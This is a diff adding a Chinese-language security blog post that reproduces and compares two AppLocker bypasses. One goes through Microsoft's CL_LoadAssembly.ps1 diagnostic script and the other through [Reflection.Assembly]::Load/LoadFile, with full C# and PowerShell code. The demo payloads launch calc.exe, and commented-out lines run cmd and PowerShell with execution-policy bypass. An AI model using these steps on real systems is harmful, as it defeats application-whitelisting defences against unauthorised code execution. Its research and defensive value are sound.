@@ -1,0 +1,259 @@
+<article class="post">
+  <h1>利用Assembly Load &amp; LoadFile绕过Applocker的分析总结</h1>
+
+  <div class="entry">
+    <h2 id="0x00-前言">0x00 前言</h2>
+<hr>
+
+<p>最近bohops在文章<a href="https://bohops.com/2018/01/07/executing-commands-and-bypassing-applocker-with-powershell-diagnostic-scripts/">《Executing Commands and Bypassing AppLocker with PowerShell Diagnostic Scripts》</a>中介绍了利用CL_LoadAssembly.ps1绕过Applocker的方法，Casey Smith早在SchmooCon 2015也提到了这个方法。本文将要对他们的两个实现方法进行复现，分析细节，比较区别，进而总结利用思路。</p>
+
+<h2 id="0x01-简介">0x01 简介</h2>
+<hr>
+
+<p>本文将要介绍以下内容：</p>
+
+<ul>
+  <li>复现bohops的方法</li>
+  <li>复现Casey Smith的方法</li>
+  <li>细节分析</li>
+  <li>总结利用思路</li>
+</ul>
+
+<h2 id="0x02-复现bohops的方法">0x02 复现bohops的方法</h2>
+<hr>
+
+<p>测试系统： Win7 x86</p>
+
+<p>开启Applocker，开启方法可参考文章《Bypass Windows AppLocker》</p>
+
+<p>开发工具: VS2012</p>
+
+<p>1、新建c#控制台工程ConsoleApplication5，默认代码如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>using System;
+using System.Collections.Generic;
+using System.Text;
+
+namespace ConsoleApplication5
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+        }
+    }
+}
+</code></pre></div></div>
+
+<p>2、修改代码，内容如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>namespace ConsoleApplication5
+{
+    public class Program
+    {
+        public static void test()
+        {
+            System.Diagnostics.Process p = new System.Diagnostics.Process();
+            p.StartInfo.FileName = "c:\\windows\\system32\\calc.exe";
+//            p.StartInfo.FileName = "c:\\windows\\system32\\cmd.exe";
+//            p.StartInfo.Arguments = @"/c ""powershell.exe"" -ep bypass -c $host";   
+            p.Start();
+        }
+        static void Main(string[] args)
+        {
+            test();
+        }
+        
+    }
+}
+</code></pre></div></div>
+
+<p><strong>注：</strong></p>
+
+<p><code class="language-plaintext highlighter-rouge">class Program</code>前需要添加访问修饰符<code class="language-plaintext highlighter-rouge">public</code>,添加Method test()同样要加访问修饰符<code class="language-plaintext highlighter-rouge">public</code></p>
+
+<p>3、修改目标框架为.net 2.0，编译生成ConsoleApplication5，保存在c:\6下</p>
+
+<p>4、powershell执行如下代码：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd C:\windows\diagnostics\system\AERO
+import-module .\CL_LoadAssembly.ps1
+LoadAssemblyFromPath ..\..\..\..\6\ConsoleApplication5.exe
+[ConsoleApplication5.Program]::test()
+</code></pre></div></div>
+
+<p><strong>注：</strong></p>
+
+<p><code class="language-plaintext highlighter-rouge">..\..\..\..\</code>能够定位到<code class="language-plaintext highlighter-rouge">c:\</code></p>
+
+<p><code class="language-plaintext highlighter-rouge">[ConsoleApplication5.Program]::test()</code>需要同程序内的代码对应，格式为：<code class="language-plaintext highlighter-rouge">[$namespace.$class]::$fuction()</code></p>
+
+<p>成功执行calc.exe，绕过applocker</p>
+
+<h2 id="0x03-复现casey-smith的方法">0x03 复现Casey Smith的方法</h2>
+<hr>
+
+<p>测试系统： Win7 x86</p>
+
+<p>开启Applocker</p>
+
+<p>代码参考地址：</p>
+
+<p>https://gist.github.com/netbiosX/5f19a3e8762b6e3fd25782d8c37b1663</p>
+
+<p>本次测试对Casey Smith的代码做细微修改</p>
+
+<p>1、新建文件bypass.cs，内容如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>using System;
+using System.Collections.Generic;
+using System.Text;
+
+public class Program
+{
+	public static void Main()
+	{
+		Console.WriteLine("Hey There From Main()");
+		//Add any behaviour here to throw off sandbox execution/analysts :)
+		
+	}
+	
+}
+public class aaa
+ {
+        public static void bbb()
+        {
+            System.Diagnostics.Process p = new System.Diagnostics.Process();
+            p.StartInfo.FileName = "c:\\windows\\system32\\calc.exe";
+//            p.StartInfo.FileName = "c:\\windows\\system32\\cmd.exe";
+//            p.StartInfo.Arguments = @"/c ""powershell.exe"" -ep bypass -c notepad.exe";   
+            p.Start();
+        }
+}
+</code></pre></div></div>
+
+<p>2、使用2.0版本的csc.exe对其编译，生成exe文件</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe  /unsafe /platform:x86 /out:bypass.exe bypass.cs
+</code></pre></div></div>
+
+<p>3、powershell执行如下代码：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$bytes = [System.IO.File]::ReadAllBytes("C:\6\bypass.exe")
+[Reflection.Assembly]::Load($bytes)
+[aaa]::bbb()
+</code></pre></div></div>
+
+<p>成功执行calc.exe，绕过applocker</p>
+
+<h2 id="0x04-对比分析">0x04 对比分析</h2>
+<hr>
+
+<h3 id="1bohops的方法">1、bohops的方法</h3>
+
+<p>加载文件CL_LoadAssembly.ps1，位于<code class="language-plaintext highlighter-rouge">C:\windows\diagnostics\system\AERO</code></p>
+
+<p>文件CL_LoadAssembly.ps1内容如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Copyright © 2008, Microsoft Corporation. All rights reserved.
+
+
+# Common library
+. .\CL_Utility.ps1
+
+function LoadAssemblyFromNS([string]$namespace)
+{
+    if([string]::IsNullorEmpty($namespace))
+    {
+        throw "Invalid namespace"
+    }
+
+    [System.Reflection.Assembly]::LoadWithPartialName($namespace) &gt; $null
+}
+
+function LoadAssemblyFromPath([string]$scriptPath)
+{
+    if([String]::IsNullorEmpty($scriptPath))
+    {
+        throw "Invalid file path"
+    }
+
+    $absolutePath = GetAbsolutionPath $scriptPath
+
+
+[System.Reflection.Assembly]::LoadFile($absolutePath) &gt; $null
+}
+</code></pre></div></div>
+
+<p>调用函数<code class="language-plaintext highlighter-rouge">LoadAssemblyFromPath</code>，本质上是调用<code class="language-plaintext highlighter-rouge">[System.Reflection.Assembly]::LoadFile($absolutePath)</code></p>
+
+<h3 id="2casey-smith的方法">2、Casey Smith的方法</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$bytes = [System.IO.File]::ReadAllBytes("C:\6\bypass.exe")
+[Reflection.Assembly]::Load($bytes)
+[aaa]::bbb()
+</code></pre></div></div>
+
+<p>调用了<code class="language-plaintext highlighter-rouge">[Reflection.Assembly]::Load($bytes)</code></p>
+
+<p><strong>注：</strong></p>
+
+<p><code class="language-plaintext highlighter-rouge">[Reflection.Assembly]</code>是<code class="language-plaintext highlighter-rouge">[System.Reflection.Assembly]</code>的简写</p>
+
+<h3 id="3对比">3、对比</h3>
+
+<p>两种方法分别使用了Assembly的LoadFile和Load方法，两者的区别在这里的影响微乎其微</p>
+
+<p>可以分别使用LoadFile和Load方法去调用以上两种方法生成的两个exe(分别由vs2012和csc.exe编译)</p>
+
+<p>互换后的代码如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$bytes = [System.IO.File]::ReadAllBytes("C:\6\ConsoleApplication5.exe")
+[Reflection.Assembly]::Load($bytes)
+[ConsoleApplication5.Program]::test()
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd C:\windows\diagnostics\system\AERO
+import-module .\CL_LoadAssembly.ps1
+LoadAssemblyFromPath ..\..\..\..\6\bypass.exe
+[aaa]::bbb()
+</code></pre></div></div>
+
+<p>经过以上测试，可以推断如下两段代码等价：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd C:\windows\diagnostics\system\AERO
+import-module .\CL_LoadAssembly.ps1
+LoadAssemblyFromPath ..\..\..\..\6\bypass.exe
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[Reflection.Assembly]::LoadFile("C:\6\bypass.exe")
+</code></pre></div></div>
+
+<p>依照以上推断，我们可以对Casey Smith的利用代码进行精简，最短的powershell实现代码如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[Reflection.Assembly]::LoadFile("C:\6\bypass.exe")
+[aaa]::bbb()
+</code></pre></div></div>
+
+<h3 id="4适用条件">4、适用条件</h3>
+
+<p>实际测试，以上两种方法适用.net 2.0，如果换成.net 4.0编译，在执行时会报错</p>
+
+<h2 id="0x05-小结">0x05 小结</h2>
+<hr>
+
+<p>本文分别对bohops和Casey Smith的方法做了测试，找到方法的本质是分别使用了Assembly的LoadFile和Load方法。经实际测试，得出该方法只适用于.Net 2.0环境</p>
+
+<hr>
+
+<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>
+
+
+  </div>
+
+  <div class="date">
+    Written on April 12, 2018
+  </div>
+
+  
+</article>
